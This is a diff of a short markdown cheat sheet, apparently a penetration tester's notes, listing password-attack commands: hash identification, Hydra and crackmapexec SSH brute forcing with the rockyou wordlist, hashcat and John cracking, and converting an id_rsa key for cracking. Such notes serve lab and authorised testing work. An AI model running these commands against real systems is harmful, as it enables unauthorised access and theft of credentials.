@@ -9,43 +9,48 @@ layout: post
 
 ###### Figuring out the kind of hash
 ```
-> hashid -e hash.txt
-> hash-identifier
+$ hashid -e hash.txt
+$ hash-identifier
 ```
 
 ###### Bruteforcing with Hydra
 ```
-> hydra -e nsr -l username -P /usr/share/wordlists/rockyou.txt 10.10.10.10 ssh
+$ hydra -e nsr -l username -P /usr/share/wordlists/rockyou.txt 10.10.10.10 ssh
 "-e nsr" = try "n" null password, "s" login as pass and/or "r" reversed login
 ```
 
 ###### Bruteforcing with Crackmapexec
 ```
-> crackmapexec ssh 10.10.10.10 -u users.txt -p passwords.txt
+$ crackmapexec ssh 10.10.10.10 -u users.txt -p passwords.txt
 Other protocols with crackmapexec: ldap,mssql,winrm,smb
 ```
 
-###### Get Windows password Policy
+###### Password policy
+```
+$ net accounts
+
+For Active Directory from powershell:
+$ Get-ADDefaultDomainPasswordPolicy
 ```
 
-```
 
 ###### Password spraying
 ```
 
 ```
+/////////////TODO:
 
 ###### Hashcat
 ```
-> echo "$1$hash" > hash.txt
-> hashcat -a 0 -m 500 hash.txt /usr/share/wordlists/rockyou.txt
+$ echo "$1$hash" > hash.txt
+$ hashcat -a 0 -m 500 hash.txt /usr/share/wordlists/rockyou.txt
 ```
 
 ###### John
 ```
-> echo "$1$hash" > hash.txt
-> john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
-> john hash.txt --show
+$ echo "$1$hash" > hash.txt
+$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+$ john hash.txt --show
 
 cracking id_rsa key
 python2.7 /usr/share/john/ssh2john.py ./id_rsa > hash.txt
